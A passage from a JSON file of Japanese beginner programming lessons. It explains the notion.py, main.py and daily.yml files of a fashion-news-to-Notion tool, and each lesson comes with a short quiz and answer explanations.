      "question": "公開日時が分からない（None の）記事は filter_recent でどうなる？",
      "choices": [
       "残される",
       "捨てられる",
       "エラーになる"
      ],
      "answer": 0,
      "explain": "「日付のない記事は残す（重複除去に任せる）」と書かれています。"
     },
     {
      "question": "`SequenceMatcher(None, a, b).ratio()` が返すのは？",
      "choices": [
       "a と b の文字数の差",
       "a と b の似ている度合い（0〜1）",
       "a が b に含まれるかどうか"
      ],
      "answer": 1,
      "explain": "1 に近いほど似ています。このコードでは 0.9 以上を同じ記事とみなします。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-06-dedupe"
  },
  {
   "title": "notion.py ― Notion にページを作る「配送担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 7,
   "concepts": [
    "http_api",
    "classes",
    "data_formats",
    "errors",
    "security"
   ],
   "lessons": [
    "10-python/10-classes",
    "10-python/04-lists-and-dicts",
    "10-python/07-exceptions",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "Notion API を使って、ジャンル見出しと記事リンクの箇条書きでページを作る。失敗時のリトライ付き。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/notion.py`\n\n```python\nfrom __future__ import annotations\n\nimport logging\nimport time\n\nimport requests\n\nfrom .models import Article\n\nlog = logging.getLogger(__name__)\nAPI = \"https://api.notion.com/v1\"\nVERSION = \"2022-06-28\"\nMAX_CHILDREN = 100  # 1回のリクエストで送れるブロック数の上限\n\n\ndef build_blocks(grouped: dict[str, list[Article]]) -> list[dict]:\n    blocks: list[dict] = []\n    for category, items in grouped.items():\n        if not items:\n            continue\n        blocks.append(\n            {\n                \"type\": \"heading_2\",\n                \"heading_2\": {\"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": category}}]},\n            }\n        )\n        for a in items:\n            blocks.append(\n                {\n                    \"type\": \"bulleted_list_item\",\n                    \"bulleted_list_item\": {\n                        \"rich_text\": [\n                            {\n                                \"type\": \"text\",\n                                \"text\": {\"content\": a.title[:1900], \"link\": {\"url\": a.url}},\n                            },\n                            {\"type\": \"text\", \"text\": {\"content\": f\" — {a.source}\"}},\n                        ]\n                    },\n                }\n            )\n    return blocks\n\n\nclass NotionClient:\n    def __init__(self, token: str):\n        self.s = requests.Session()\n        self.s.headers.update(\n            {\n                \"Authorization\": f\"Bearer {token}\",\n                \"Notion-Version\": VERSION,\n                \"Content-Type\": \"application/json\",\n            }\n        )\n\n    def _request(self, method: str, path: str, **kw) -> dict:\n        for attempt in range(4):\n            r = self.s.request(method, f\"{API}{path}\", timeout=30, **kw)\n            if r.status_code == 429 or r.status_code >= 500:\n                time.sleep(float(r.headers.get(\"Retry-After\", 2 ** attempt)))\n                continue\n            if not r.ok:\n                raise RuntimeError(f\"Notion API {r.status_code}: {r.text[:300]}\")\n            return r.json()\n        raise RuntimeError(f\"Notion API が繰り返し失敗: {method} {path}\")\n\n    def find_child_page(self, parent_id: str, title: str) -> str | None:\n        cursor = None\n        while True:\n            params = {\"page_size\": 100, **({\"start_cursor\": cursor} if cursor else {})}\n            data = self._request(\"GET\", f\"/blocks/{parent_id}/children\", params=params)\n            for b in data[\"results\"]:\n                if b[\"type\"] == \"child_page\" and b[\"child_page\"][\"title\"] == title:\n                    return b[\"id\"]\n            if not data.get(\"has_more\"):\n                return None\n            cursor = data[\"next_cursor\"]\n\n    def create_daily_page(self, parent_id: str, title: str, blocks: list[dict]) -> str:\n        page = self._request(\n            \"POST\",\n            \"/pages\",\n            json={\n                \"parent\": {\"page_id\": parent_id},\n                \"properties\": {\"title\": {\"title\": [{\"text\": {\"content\": title}}]}},\n                \"children\": blocks[:MAX_CHILDREN],\n            },\n        )\n        for i in range(MAX_CHILDREN, len(blocks), MAX_CHILDREN):\n            self._request(\n                \"PATCH\",\n                f\"/blocks/{page['id']}/children\",\n                json={\"children\": blocks[i : i + MAX_CHILDREN]},\n            )\n        return page[\"url\"]\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**Notion API（プログラムから Notion を操作する窓口）を使って、ニュースのページを作る** ファイルです。ページの中身を Notion の形式に組み立てる関数と、Notion とやりとりするクラスの 2 つでできています。\n\n## 🗺️ 全体の流れ\n\n1. `build_blocks`：ジャンル別の記事を、Notion の「ブロック」（見出し・箇条書きなどの部品）のリストに変換する\n2. `NotionClient(token)`：トークン（合言葉）を持った通信係を作る\n3. `find_child_page`：同じタイトルのページ（例：「2026-11-16 朝刊」）がもう無いか調べる\n4. `create_daily_page`：ページを作り、ブロックを 100 個ずつ送り込む\n5. 通信が混雑・失敗したら、少し待ってやり直す（`_request`）\n\n## 🔍 ブロックごとの解説\n\n### Notion の「ブロック」は辞書の入れ子\n\nNotion のページは「ブロック」という部品の積み重ねです。API には、それを **辞書（JSON）** で送ります。\n\n```python\n{\"type\": \"heading_2\", \"heading_2\": {\"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": \"ストリート/スニーカー\"}}]}}\n```\n\n入れ子が深くて読みにくいですが、外側から読むと「種類は見出し 2（`##`）で、文字は『ストリート/スニーカー』」というだけです。\n記事は箇条書き（`bulleted_list_item`）で、タイトルにリンクを付け、後ろに「 — 出典名」を付けています。\n`a.title[:1900]` は、Notion の 1 つの文字ブロックの上限（2000 文字）を超えないように、念のため切っています。\n\n### NotionClient：通信係のクラス\n\n```python\nself.s = requests.Session()\nself.s.headers.update({\"Authorization\": f\"Bearer {token}\", ...})\n```\n\n- `requests.Session()`：同じ相手と何度もやりとりするための「通信の窓口」。ヘッダーを一度設定すれば毎回付けてくれる\n- `Authorization: Bearer トークン`：「この合言葉を持っている者です」と名乗る。**トークンはコードに書かず、`main.py` が環境変数から受け取って渡している**\n- `Notion-Version`：どの版の API の仕様で話すかを指定\n\n### _request：混雑していたら待ってやり直す\n\n```python\nfor attempt in range(4):\n    r = self.s.request(method, f\"{API}{path}\", timeout=30, **kw)\n    if r.status_code == 429 or r.status_code >= 500:\n        time.sleep(float(r.headers.get(\"Retry-After\", 2 ** attempt)))\n        continue\n```\n\n- `429`：「アクセスが多すぎます」、`500` 番台：「サーバー側の不調」。どちらも **時間をおけば成功するかもしれない** エラー\n- `Retry-After`（何秒待てばいいか）が返ってくればその秒数、無ければ 1, 2, 4, 8 秒…と **だんだん長く待つ**（指数バックオフ）\n- 最大 4 回試してダメならエラーにする\n- 400 番台（リクエストの間違い・権限なし）は待っても直らないので、すぐにエラーにする\n- 名前の先頭の `_` は「クラスの中だけで使う」という慣習\n- `**kw` は「受け取ったキーワード引数を、そのまま次に渡す」（`params=` や `json=` を中継している）\n\n### find_child_page：ページの一覧を少しずつ読む\n\n```python\nwhile True:\n    data = self._request(\"GET\", f\"/blocks/{parent_id}/children\", params=params)\n    ...\n    if not data.get(\"has_more\"):\n        return None\n    cursor = data[\"next_cursor\"]\n```\n\nNotion は一度に 100 件までしか返さないので、「続きがある（`has_more`）なら、続きの目印（`cursor`）を付けてもう一度聞く」を繰り返します。これを **ページネーション** と呼び、多くの Web API で見る形です。\n\n### create_daily_page：100 個ずつ送る\n\n最初の 100 ブロックはページ作成と同時に送り、残りは `PATCH`（追加）で 100 個ずつ送ります。\n`range(100, len(blocks), 100)` は 100, 200, 300… と 100 刻みの数を作り、`blocks[i : i + 100]` でそこから 100 個を切り出します。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `**({\"start_cursor\": cursor} if cursor else {})` | cursor があるときだけ辞書に項目を足す。`**` は辞書を展開して合体させる |\n| `**kw` | 受け取ったキーワード引数をまとめて受け取り、そのまま渡す |\n| `2 ** attempt` | 2 の attempt 乗（1, 2, 4, 8） |\n| `blocks[i : i + 100]` | スライス。範囲外でもエラーにならず、ある分だけ返る |\n| `raise RuntimeError(...)` | 自分でエラーを起こす。`main.py` まで伝わってプログラムが失敗として終わる |\n\n## 🔑 キーワード\n\n- **Notion API**：プログラムから Notion を操作する窓口\n- **ブロック**：Notion のページを作る部品（見出し・段落・箇条書きなど）\n- **トークン（Bearer）**：API を使う権利を示す合言葉。秘密情報\n- **セッション**：同じ相手とのやりとりをまとめて管理する仕組み\n- **リトライ・指数バックオフ**：失敗したら待ち時間を倍々に増やしてやり直すこと\n- **ページネーション**：データを何回かに分けて受け取る仕組み\n- **ステータスコード**：200（成功）、429（多すぎ）、500（サーバーの不調）など、結果を表す番号\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ トークンをコードに書かず、外から受け取っている\n- ✅ 混雑時は待ってやり直し、直らないエラーはすぐ止める、という使い分けができている\n- ✅ ブロック数や文字数の上限を考慮している\n- ⚠️ ページを作ったあと、残りのブロックの追加に失敗すると、**途中までのページが Notion に残る**。次の回は「作成済み」と判定されて作り直されない（`--force` で作り直せる）\n- ⚠️ `Notion-Version: 2022-06-28` は固定。Notion 側で古い版が使えなくなったら更新が必要になる\n\n## 🗣️ 30 秒で人に説明するなら\n\n「notion.py は Notion への配送担当です。ジャンルごとの記事を、Notion の見出しブロックとリンク付きの箇条書きブロックに組み立てて、Notion API でページを作ります。\nトークンはヘッダーに付けて送り、混雑やサーバーエラーのときは待ち時間を増やしながら最大 4 回やり直します。\n同じタイトルのページが既にあるかを調べる機能もあって、二重に作らないようにしています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "Notion API が 429 を返したとき、このコードはどうする？",
      "choices": [
       "すぐにエラーで終了する",
       "少し待ってからやり直す",
       "別の API に切り替える"
      ],
      "answer": 1,
      "explain": "429 は「多すぎる」の意味なので、待てば成功する可能性があります。"
     },
     {
      "question": "Notion API が 401（認証エラー）を返したときは？",
      "choices": [
       "やり直さずにすぐエラーにする",
       "4 回までやり直す",
       "無視して次に進む"
      ],
      "answer": 0,
      "explain": "400 番台は待っても直らないので、`raise RuntimeError` ですぐ止めます。"
     },
     {
      "question": "ブロックが 250 個あるとき、create_daily_page は API を何回呼ぶ？",
      "choices": [
       "1 回",
       "2 回",
       "3 回"
      ],
      "answer": 2,
      "explain": "ページ作成で 100 個、そのあと PATCH で 100 個と 50 個を送ります。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-07-notion"
  },
  {
   "title": "main.py ― すべての部品を順番に動かす「工場長」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 8,
   "concepts": [
    "functions",
    "io",
    "data_formats",
    "errors",
    "collections",
    "security"
   ],
   "lessons": [
    "10-python/05-functions",
    "10-python/08-modules",
    "10-python/11-files-and-json",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "設定と履歴を読み込み、集める → ふるう → 仕分ける → Notion に作る → 履歴を保存する、を順に指示する司令塔。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/main.py`\n\n```python\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport logging\nimport os\nfrom datetime import datetime, timedelta, timezone\nfrom pathlib import Path\n\nimport yaml\n\nfrom .classify import apply_source_filters, category_order, classify\nfrom .dedupe import dedupe, filter_recent, normalize_url\nfrom .fetch import fetch_all\nfrom .models import Article\nfrom .notion import NotionClient, build_blocks\n\nlog = logging.getLogger(\"fashion_news\")\nJST = timezone(timedelta(hours=9))\nROOT = Path(__file__).resolve().parents[2]\nSEEN_KEEP_DAYS = 30\n\n\ndef load_seen(path: Path) -> dict[str, str]:\n    if not path.exists():\n        return {}\n    return json.loads(path.read_text(encoding=\"utf-8\") or \"{}\")\n\n\ndef prune_seen(seen: dict[str, str], today: str) -> dict[str, str]:\n    limit = (datetime.fromisoformat(today) - timedelta(days=SEEN_KEEP_DAYS)).date().isoformat()\n    return {u: d for u, d in seen.items() if d >= limit}\n\n\ndef group_articles(articles: list[Article], config: dict) -> dict[str, list[Article]]:\n    grouped = {name: [] for name in category_order(config)}\n    for a in articles:\n        a.category = classify(a, config)\n        grouped[a.category].append(a)\n    limit = config.get(\"max_per_category\")\n    oldest = datetime.min.replace(tzinfo=timezone.utc)\n    for name, items in grouped.items():\n        items.sort(key=lambda a: a.published or oldest, reverse=True)  # 新しい順\n        if limit:\n            grouped[name] = items[:limit]\n    return grouped\n\n\ndef render_text(title: str, grouped: dict[str, list[Article]]) -> str:\n    lines = [f\"# {title}\"]\n    for cat, items in grouped.items():\n        if items:\n            lines.append(f\"\\n## {cat}\")\n            lines += [f\"- {a.title} ({a.source}) {a.url}\" for a in items]\n    return \"\\n\".join(lines)\n\n\ndef page_title(now: datetime) -> str:\n    \"\"\"JST の正午より前なら朝刊、それ以降は夕刊。\"\"\"\n    jst = now.astimezone(JST)\n    return f\"{jst.date().isoformat()} {'朝刊' if jst.hour < 12 else '夕刊'}\"\n\n\ndef run(dry_run: bool, force: bool, now: datetime | None = None) -> int:\n    now = now or datetime.now(timezone.utc)\n    today = now.astimezone(JST).date().isoformat()\n    title = page_title(now)\n\n    sources = yaml.safe_load((ROOT / \"config/sources.yaml\").read_text(encoding=\"utf-8\"))[\"sources\"]\n    config = yaml.safe_load((ROOT / \"config/categories.yaml\").read_text(encoding=\"utf-8\"))\n    seen_path = ROOT / \"data/seen_urls.json\"\n    seen = load_seen(seen_path)\n\n    client = parent_id = None\n    if not dry_run:\n        token = (os.environ.get(\"NOTION_TOKEN\") or \"\").strip()\n        parent_id = (os.environ.get(\"NOTION_PARENT_PAGE_ID\") or \"\").strip()\n        if not token or not parent_id:\n            log.error(\"NOTION_TOKEN と NOTION_PARENT_PAGE_ID が必要です\")\n            return 1\n        if not token.isascii() or not token.isprintable() or \" \" in token:\n            log.error(\n                \"NOTION_TOKEN に半角英数字以外の文字（日本語・記号・空白・改行など）が含まれています。\"\n                \"Notion のインテグレーション画面のコピーアイコンでトークンをコピーし直して登録してください\"\n            )\n            return 1\n        client = NotionClient(token)\n        if not force and client.find_child_page(parent_id, title):\n            log.info(\"%s は作成済みのため終了します（--force で再作成）\", title)\n            return 0\n\n    fetched = fetch_all(sources)\n    if not fetched:\n        log.error(\"全ての情報源の取得に失敗しました\")\n        return 1\n    candidates = apply_source_filters(filter_recent(fetched, now), sources, config)\n    grouped = group_articles(dedupe(candidates, set(seen)), config)\n    articles = [a for items in grouped.values() for a in items]  # 上限で落とした記事は履歴に入れない\n    log.info(\"取得 %d件 → 掲載 %d件\", len(fetched), len(articles))\n\n    if dry_run:\n        print(render_text(title, grouped))\n        return 0\n\n    blocks = build_blocks(grouped) or [\n        {\n            \"type\": \"paragraph\",\n            \"paragraph\": {\"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": \"本日の新着記事はありませんでした。\"}}]},\n        }\n    ]\n    url = client.create_daily_page(parent_id, title, blocks)\n    log.info(\"Notion に作成しました: %s\", url)\n\n    seen.update({normalize_url(a.url): today for a in articles})\n    seen_path.write_text(\n        json.dumps(prune_seen(seen, today), ensure_ascii=False, indent=0, sort_keys=True) + \"\\n\",\n        encoding=\"utf-8\",\n    )\n    return 0\n\n\ndef main() -> None:\n    ap = argparse.ArgumentParser(description=\"毎朝のファッションニュースを Notion に作成する\")\n    ap.add_argument(\"--dry-run\", action=\"store_true\", help=\"Notion に書かず標準出力に表示\")\n    ap.add_argument(\"--force\", action=\"store_true\", help=\"同じ日のページがあっても作成する\")\n    args = ap.parse_args()\n    logging.basicConfig(level=logging.INFO, format=\"%(levelname)s %(message)s\")\n    raise SystemExit(run(args.dry_run, args.force))\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、このプログラムの **司令塔** です。自分ではあまり細かい作業をせず、ここまでに読んだ部品（fetch・classify・dedupe・notion）を **正しい順番で呼び出す** ことが主な仕事です。130 行ほどありますが、一番大事なのは `run` 関数です。\n\n## 🗺️ 全体の流れ\n\n`main()` → `run()` の順に動きます。`run` の中身はこうです。\n\n1. **準備**：今の日時から「2026-11-16 朝刊」のようなタイトルを決め、設定ファイル 2 つと掲載履歴を読む\n2. **確認**：Notion のトークンがあるか・おかしな文字が混ざっていないかを確かめ、同じタイトルのページが既にあれば終わる\n3. **集める**：`fetch_all` で全サイトの記事を取る（全滅ならエラー終了）\n4. **ふるう**：古い記事・ファッションと関係ない記事・重複・掲載済みを除く\n5. **仕分ける**：`group_articles` でジャンル分けし、新しい順に各 20 件まで\n6. **届ける**：Notion にページを作る（記事 0 件なら「新着はありませんでした」と書く）\n7. **記録する**：載せた記事の URL を履歴に追加し、30 日より古い履歴を消して保存\n\n## 🔍 ブロックごとの解説\n\n### 定数：プログラム全体で使う決まった値\n\n```python\nJST = timezone(timedelta(hours=9))\nROOT = Path(__file__).resolve().parents[2]\n```\n\n- `JST`：日本時間（UTC＋9 時間）\n- `ROOT`：このファイル（`src/fashion_news/main.py`）から 2 つ上のフォルダ＝リポジトリの一番上。ここを基準に `config/` や `data/` を探すので、どこから実行しても同じファイルを読める\n\n### page_title：朝刊か夕刊か\n\n```python\njst = now.astimezone(JST)\nreturn f\"{jst.date().isoformat()} {'朝刊' if jst.hour < 12 else '夕刊'}\"\n```\n\nサーバーの時計は UTC なので、**日本時間に直してから** 日付と時刻を判断しています。日本時間 6:30 は UTC では前日の 21:30 なので、直さないと日付が 1 日ずれます。\n\n### 安全チェック：トークンのコピーミスを見つける\n\n```python\nif not token.isascii() or not token.isprintable() or \" \" in token:\n```\n\nトークンに日本語や空白・改行が混ざっていないか確かめています。GitHub の Secrets に貼り付けるときのコピーミスを、分かりやすいメッセージで知らせるための工夫です。\n\n### パイプラインの本体（3 行）\n\n```python\ncandidates = apply_source_filters(filter_recent(fetched, now), sources, config)\ngrouped = group_articles(dedupe(candidates, set(seen)), config)\narticles = [a for items in grouped.values() for a in items]\n```\n\n関数の中に関数を入れているので、**内側から読む** のがコツです。\n\n1. `filter_recent(fetched, now)`：新しい記事だけ\n2. `apply_source_filters(...)`：ファッションと関係ない記事を除く\n3. `dedupe(candidates, set(seen))`：重複・掲載済みを除く\n4. `group_articles(...)`：ジャンル分けして各 20 件まで\n5. 最後の行：ジャンル別に分かれた記事を 1 本のリストに戻す（二重の内包表記）\n\n### group_articles：仕分けと並べ替え\n\n```python\nitems.sort(key=lambda a: a.published or oldest, reverse=True)\n```\n\n公開日時の新しい順に並べます。日時が無い記事は「一番古い日時」として扱い、一番後ろへ。そのあと `items[:limit]` で上位 20 件だけ残します。\n\n### 履歴の保存\n\n```python\nseen.update({normalize_url(a.url): today for a in articles})\nseen_path.write_text(json.dumps(prune_seen(seen, today), ensure_ascii=False, ...))\n```\n\n- 載せた記事の URL と今日の日付を、辞書に追加する\n- `prune_seen`：30 日より前の記録を消す（ファイルが大きくなりすぎないように）\n- JSON にしてファイルに書き戻す。このあと GitHub Actions がコミットして保存する（9 ページ目）\n- **上限の 20 件からあふれた記事は履歴に入れない**ので、次の回に載るチャンスが残る\n\n### main：コマンドの受け付け口\n\n```python\nap.add_argument(\"--dry-run\", action=\"store_true\", ...)\nraise SystemExit(run(args.dry_run, args.force))\n```\n\n- `argparse`：`python -m fashion_news --dry-run` のような **コマンドのオプション** を読み取る標準ライブラリ\n- `--dry-run`：Notion に書かず、結果を画面に表示するだけ（試し運転）\n- `--force`：同じタイトルのページがあっても作る\n- `run` は成功なら `0`、失敗なら `1` を返し、`SystemExit` でそれを **終了コード** として外に伝える。GitHub Actions は 1 を見て「失敗」と判断し、メールで知らせてくれる\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `now = now or datetime.now(...)` | 引数で日時が渡されなければ今の日時。**テストで日時を固定できる** ようにする工夫 |\n| `client = parent_id = None` | 2 つの変数をまとめて None にする |\n| `build_blocks(grouped) or [...]` | 空のリストなら代わりに「新着なし」のブロックを使う |\n| `[a for items in ... for a in items]` | 二重のループの内包表記。左の for が外側 |\n| `return 1` / `return 0` | 終了コード。0 が成功、それ以外が失敗という OS の慣習 |\n\n## 🔑 キーワード\n\n- **司令塔（オーケストレーション）**：部品を順番に呼び出して全体を動かす役\n- **argparse**：コマンドラインのオプションを読み取る標準ライブラリ\n- **環境変数**：プログラムの外から渡す設定値（ここではトークン）\n- **タイムゾーン**：UTC と JST（日本時間）のような時差の扱い\n- **終了コード**：プログラムが成功（0）か失敗（1 など）かを外に伝える番号\n- **ドライラン**：本番の書き込みをしない試し運転\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 部品の呼び出し順が `run` にまとまっていて、全体の流れが追いやすい\n- ✅ トークンが無い・壊れている場合に、分かりやすいメッセージで止まる\n- ✅ 時刻を引数で渡せるので、テストで「朝刊／夕刊」の切り替えを確かめられる\n- ✅ 記事が 0 件でもページを作る（要件どおり）\n- ⚠️ `run` が「設定の読み込み」から「保存」まで多くの役割を持っていて長め。今は読める長さだが、機能を足すなら分けたい\n- ⚠️ 設定ファイルの書き間違い（`sources` キーが無いなど）は、分かりにくいエラー（KeyError）で止まる\n\n## 🗣️ 30 秒で人に説明するなら\n\n「main.py は全体の司令塔です。日本時間でページのタイトルを決めて、設定と掲載履歴を読み、Notion のトークンを確認してから、記事を集める、古いものと重複を除く、ジャンル分けして 20 件ずつにする、Notion にページを作る、という順に部品を呼びます。\n最後に載せた URL を履歴ファイルに保存して、次の回に同じ記事が出ないようにしています。--dry-run を付ければ Notion に書かずに試せます。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "日本時間 2026-11-14 の 6:30 に実行したとき、ページのタイトルは？",
      "choices": [
       "2026-11-13 夕刊",
       "2026-11-14 朝刊",
       "2026-11-13 朝刊"
      ],
      "answer": 1,
      "explain": "UTC では 11/13 21:30 ですが、日本時間に直してから判断するので 11/14 の朝刊です。"
     },
     {
      "question": "`--dry-run` を付けて実行すると？",
      "choices": [
       "Notion には書かず、結果を画面に表示する",
       "Notion のページを削除する",
       "履歴ファイルだけ更新する"
      ],
      "answer": 0,
      "explain": "dry_run のときは表示して return 0 で終わり、履歴も書き換えません。"
     },
     {
      "question": "ジャンルの上限 20 件からあふれた記事はどうなる？",
      "choices": [
       "履歴に入り、二度と載らない",
       "履歴に入らないので、次の回に載る可能性がある",
       "「その他」に移される"
      ],
      "answer": 1,
      "explain": "コメントの「上限で落とした記事は履歴に入れない」がその意図です。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-08-main"
  },
  {
   "title": "daily.yml ― 毎日 2 回、自動で動かす GitHub Actions の設定",
   "language": "YAML",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 9,
   "concepts": [
    "tooling",
    "version_control",
    "security",
    "data_formats"
   ],
   "lessons": [
    "100-ai-dev/04-git-basics",
    "100-ai-dev/06-secrets-env",
    "10-python/08-modules"
   ],
   "summary": "毎日 6:30 と 17:30（日本時間）に GitHub のサーバーでプログラムを動かし、掲載履歴をコミットする設定。",
   "body": "## 📄 解説するコード\n\n`.github/workflows/daily.yml`\n\n```yaml\nname: daily-fashion-news\n\non:\n  schedule:\n    - cron: \"30 21 * * *\" # 毎日 6:30 JST（朝刊）。混雑時の遅れを見込んで 7:00 の30分前\n    - cron: \"30 8 * * *\" # 毎日 17:30 JST（夕刊）。18:00 の30分前\n  workflow_dispatch:\n    inputs:\n      force:\n        description: \"同じ日のページがあっても作成する\"\n        type: boolean\n        default: false\n\npermissions:\n  contents: write # data/seen_urls.json をコミットするため\n\nconcurrency:\n  group: daily-fashion-news\n  cancel-in-progress: false\n\njobs:\n  run:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n          cache: pip\n      - run: pip install -r requirements.txt\n      - name: Notion にページを作成\n        env:\n          NOTION_TOKEN: ${{ secrets.NOTION_TOKEN }}\n          NOTION_PARENT_PAGE_ID: ${{ secrets.NOTION_PARENT_PAGE_ID }}\n          PYTHONPATH: src\n        run: python -m fashion_news ${{ inputs.force && '--force' || '' }}\n      - name: 掲載済みURLの履歴をコミット\n        run: |\n          if [ -n \"$(git status --porcelain data/seen_urls.json)\" ]; then\n            git config user.name \"github-actions[bot]\"\n            git config user.email \"41898282+github-actions[bot]@users.noreply.github.com\"\n            git add data/seen_urls.json\n            git commit -m \"chore: 掲載済みURLの履歴を更新\"\n            git push\n          fi\n```\n\n## 🧭 ひとことで言うと\n\n**YAML** で書かれた **GitHub Actions の設定ファイル** です。「いつ」「どんなパソコンで」「どの順番で何を実行するか」を書いておくと、GitHub が自分のサーバーで代わりに動かしてくれます。このファイルのおかげで、あなたのパソコンが寝ていてもニュースが届きます。\n\n## 🗺️ 全体の流れ\n\n1. **きっかけ（on）**：毎日 6:30 と 17:30（日本時間）、または Actions の画面から手動で\n2. **準備**：GitHub が Ubuntu（Linux）のパソコンを 1 台用意する\n3. **手順（steps）**：\n   1. リポジトリのコードを取ってくる\n   2. Python 3.12 を入れる\n   3. 必要なライブラリを入れる\n   4. Secrets から Notion のトークンを受け取って、プログラムを実行する\n   5. 掲載履歴（`seen_urls.json`）が変わっていればコミットして GitHub に保存する\n4. 終わったらそのパソコンは捨てられる（だから履歴をファイルにして保存しておく必要がある）\n\n## 🔍 ブロックごとの解説\n\n### on：いつ動かすか\n\n```yaml\nschedule:\n  - cron: \"30 21 * * *\"\n```\n\n`cron` は「分 時 日 月 曜日」の順に時刻を書く書き方です。`*` は「毎」。\n**時刻は UTC（世界標準時）** なので、`30 21` は UTC の 21:30 ＝ 日本時間の翌朝 6:30 です（日本は 9 時間進んでいる）。\nGitHub は混雑すると数分〜数十分遅れることがあるので、7:00 に間に合うよう 30 分早めにしています。\n\n`workflow_dispatch` は「Actions の画面の Run workflow ボタンで手動実行できる」設定で、`force` というチェックボックスも付けています。\n\n### permissions と concurrency\n\n| 設定 | 意味 |\n|---|---|\n| `contents: write` | 履歴ファイルをコミットして push するために、書き込み権限をもらう |\n| `concurrency` | 同じ処理が 2 つ同時に動かないようにする。前の実行が終わるまで次は待つ（`cancel-in-progress: false`） |\n| `timeout-minutes: 10` | 10 分を超えたら打ち切る（固まったときの保険） |\n\n### steps：手順\n\n```yaml\n- uses: actions/checkout@v4\n- uses: actions/setup-python@v5\n```\n\n`uses:` は「誰かが作った便利な部品（アクション）を使う」。`@v4` はそのバージョンです。\n`run:` は「このコマンドを実行する」。\n\n```yaml\nenv:\n  NOTION_TOKEN: ${{ secrets.NOTION_TOKEN }}\n  PYTHONPATH: src\nrun: python -m fashion_news ${{ inputs.force && '--force' || '' }}\n```\n\n- `${{ secrets.NOTION_TOKEN }}`：リポジトリの Settings → Secrets に登録した値を、**環境変数** としてプログラムに渡す。ログには `***` と伏せて表示される\n- `${{ inputs.force && '--force' || '' }}`：手動実行で force にチェックしたときだけ `--force` を付ける（「条件 && A || B」で「条件なら A、でなければ B」）\n\n### 最後の step：履歴を保存する\n\n```bash\nif [ -n \"$(git status --porcelain data/seen_urls.json)\" ]; then\n  git add data/seen_urls.json\n  git commit -m \"chore: 掲載済みURLの履歴を更新\"\n  git push\nfi\n```\n\nこれは YAML の中に書かれた **シェル（Bash）のコマンド** です。\n\n- `git status --porcelain ファイル`：そのファイルが変わっていれば何か表示される\n- `[ -n \"...\" ]`：「文字が空でなければ」\n- 変わっていたときだけ、コミットして push する\n\nGitHub のコミット履歴に「chore: 掲載済みURLの履歴を更新」が毎日並んでいるのは、このステップのしわざです。\n\n## 🐍 Python と比べると\n\n| daily.yml | Python で言うと |\n|---|---|\n| `steps:` の並び | 上から順に実行される命令 |\n| `env:` | `os.environ[\"NOTION_TOKEN\"]` で読める値を用意しておく |\n| `if [ -n \"...\" ]; then ... fi` | `if 変更あり: ...` |\n| `${{ 条件 && 'A' \\|\\| 'B' }}` | `'A' if 条件 else 'B'` |\n\n## 🔑 キーワード\n\n- **GitHub Actions**：GitHub のサーバーでプログラムを自動実行する仕組み\n- **ワークフロー**：Actions で実行する一連の手順（このファイル 1 つ分）\n- **cron**：決まった時刻に実行するための時刻の書き方\n- **Secrets**：GitHub に保存する秘密の値。コードやログに出ない\n- **runner（ubuntu-latest）**：処理を実行するために GitHub が用意するパソコン\n- **アクション（uses）**：他の人が作った、再利用できる手順の部品\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ トークンを Secrets で渡していて、コードやリポジトリに書いていない\n- ✅ 同時実行の防止・タイムアウト・手動実行と、運用に必要なものがそろっている\n- ✅ 履歴ファイルに変更があるときだけコミットする\n- ⚠️ 実行中にあなたが同じブランチに別の変更を push していると、最後の `git push` が「先に進まれている」と失敗することがある（めったに起きない。次の回で取り戻せる）\n- ⚠️ GitHub は、**60 日間リポジトリに動きが無いと、スケジュール実行を自動で止める** ことがある。ただしこのワークフローは毎回コミットしているので、止まりにくい\n- ⚠️ 公開リポジトリなので、実行ログ（取得件数など）は誰でも見られる。Secrets の値は伏せられるので漏れない\n\n## 🗣️ 30 秒で人に説明するなら\n\n「daily.yml は GitHub Actions の設定です。cron で UTC の 21:30 と 8:30、つまり日本時間の 6:30 と 17:30 に、GitHub のサーバーで Python を準備してプログラムを動かします。\nNotion のトークンは Secrets から環境変数で渡していて、実行後に掲載履歴の JSON が変わっていれば、自動でコミットして保存します。手動実行用のボタンも付いています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`cron: \"30 8 * * *\"` は日本時間の何時？",
      "choices": [
       "8:30",
       "17:30",
       "23:30"
      ],
      "answer": 1,
      "explain": "cron の時刻は UTC です。日本時間は 9 時間足して 17:30 になります。"
     },
     {
      "question": "`${{ secrets.NOTION_TOKEN }}` の値はどこに保存されている？",
      "choices": [
       "daily.yml の中",
       "README.md の中",
       "GitHub のリポジトリ設定（Secrets）"
      ],
      "answer": 2,
